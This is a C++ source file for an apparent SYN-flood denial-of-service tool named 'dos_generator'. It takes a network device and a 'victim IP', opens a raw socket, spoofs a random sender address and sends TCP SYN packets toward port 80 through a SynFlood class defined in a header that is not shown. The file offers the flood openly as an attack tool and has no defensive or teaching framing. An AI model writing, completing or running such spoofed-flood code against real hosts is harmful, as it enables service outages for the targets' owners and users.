#include <iostream>
#include "dosgenerator.h"

using namespace std;

void usage()
{
    cout<<"Usage : dos_generator <dev> <victim IP> "<<endl;
    exit(1);
}
int main(int argc, char* argv[])
{
    //TODO : make glog class and remain logs.

    if(argc != 3) usage();

    SynFlood synFlood;

//    init pcd for send packet
//    synFlood.pcd_init(argv[1]);

    synFlood.raw_init();
    synFlood.raw_init();

    //set target ip to argv[2]
    synFlood.target_ip_=argv[2];
    //set sender ip random
    synFlood.sender_ip_.set_rand_ip();

    //set ip header
    synFlood.init_iph(synFlood.sender_ip_,synFlood.target_ip_);
    synFlood.init_tcph(1234,80);


    synFlood.generate();


    return 0;
}
